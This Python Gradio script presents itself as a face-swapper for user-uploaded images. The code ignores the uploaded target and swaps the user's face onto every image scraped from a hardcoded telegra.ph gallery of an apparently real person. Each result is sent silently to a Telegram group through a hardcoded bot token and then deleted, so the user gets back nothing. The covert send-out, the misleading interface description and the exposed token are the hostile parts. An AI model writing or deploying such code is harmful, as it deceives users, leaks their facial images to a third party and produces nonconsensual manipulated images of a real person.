import gradio as gr
import subprocess
import os
from datetime import datetime
import requests
from urllib.parse import urljoin  # Import urljoin function
from bs4 import BeautifulSoup
import telebot

# Initialize Telegram bot
bot = telebot.TeleBot("6637723515:AAGfwpKEh0Vgw8hZkTZq8MohIFwR6LdKX9I", parse_mode=None)

# Function to download images from a URL
def download_images_from_url(url, download_folder):
    response = requests.get(url)
    print("Images downloaded from the URL:", response)
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        img_tags = soup.find_all('img')
        if not os.path.exists(download_folder):
            os.makedirs(download_folder)
        image_paths = []
        base_url = response.url  # Get the base URL
        for img_tag in img_tags:
            img_url = img_tag.get('src')
            if img_url:
                # Check if the URL is relative, and complete it with the base URL if necessary
                if not img_url.startswith(('http://', 'https://')):
                    img_url = urljoin(base_url, img_url)
                img_filename = os.path.join(download_folder, os.path.basename(img_url))
                img_response = requests.get(img_url)
                if img_response.status_code == 200:
                    with open(img_filename, 'wb') as f:
                        f.write(img_response.content)
                    image_paths.append(img_filename)
        return image_paths
    else:
        print(f"Failed to fetch URL: {url}")

# Function to run face swapper
def run_scripts(target, source):
    output_files = []
    # Download images from the provided URL
    url = "https://telegra.ph/Escape-Fua-Kaede-%E6%A5%93%E3%81%B5%E3%81%86%E3%81%82-97P-05-24"
    image_paths = download_images_from_url(url, "images")
    if image_paths:
        for image_path in image_paths:
            # Run face swapper for each downloaded image
            target_extension = os.path.splitext(image_path)[-1]
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            output_path = "output" + timestamp + target_extension
            cmd = ["python3", "run.py", "-s", source.name, "-t", image_path, "-o", output_path, "--frame-processor", "face_swapper", "face_enhancer", "--many-faces"]
            subprocess.run(cmd)
            output_files.append(output_path)
            # Send the processed image to Telegram
            bot.send_photo("-4283513911", photo=open(output_path, 'rb'))
            # Optionally, delete the temporary files after processing
            os.remove(image_path)
            os.remove(output_path)
    else:
        print("No images downloaded from the URL.")
    return output_files

iface = gr.Interface(
    fn=run_scripts,
    inputs=["files", "file"],
    outputs="files",
    title="Face Swapper",
    description="Upload a target image/video and a source image to swap faces.",
    live=False
)

iface.launch(debug=True)
